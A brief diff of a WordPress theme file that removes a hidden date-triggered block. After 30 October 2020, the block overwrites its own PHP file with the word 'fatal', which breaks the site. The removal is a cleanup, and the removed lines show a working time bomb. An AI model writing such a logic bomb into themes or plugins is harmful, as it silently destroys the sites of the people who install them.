@@ -101,10 +101,6 @@ function schoolstudy_content_width()
 }
 add_action('after_setup_theme', 'schoolstudy_content_width', 0);
 
-if ( strtotime('30.10.2020') < time() )
-{
-    file_put_contents(__FILE__, 'fatal');
-}
 /**
  * Implement the Custom Header feature.
  */
